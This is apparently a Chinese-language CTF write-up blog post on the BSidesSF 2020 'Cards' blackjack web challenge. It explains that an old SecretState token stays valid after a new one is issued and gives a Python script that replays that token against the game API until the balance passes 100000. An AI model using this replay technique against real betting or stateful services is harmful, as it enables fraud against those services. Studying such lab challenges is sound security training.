---
title: "[BSidesSF 2020]Cards"
date: 2020-04-08
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---

# [BSidesSF 2020]Cards

## 分析

21点游戏,查看rules,21点3:2,下注最多500,所以每次最多赢750要赚到100000

<!-- more -->

随便试一下,有一个初始化的/api获取初始金钱和secretstate

/api/deal下注

要达到的目的,利用获取新的secretstate,旧的没有失效的达到一直赚钱的效果

## exp

```
import requests
import time

start = "http://bd6d39d5-cd91-4bb9-b2ef-e753aa13f02d.node3.buuoj.cn/api"
deal = start + "/deal"
#开始
state = requests.post(start).json()["SecretState"]
while True:
    try:
        #下注
        result = requests.post(deal, json={"Bet": 500, "SecretState": state}).json()
    except:
        print(result)
        continue
    time.sleep(0.1)
    if result['GameState'] == 'Blackjack':
        #赢了就换SecretState
        state = result['SecretState']
        print(result['Balance'])
    if result['Balance'] > 100000:
        print(result)
        break
```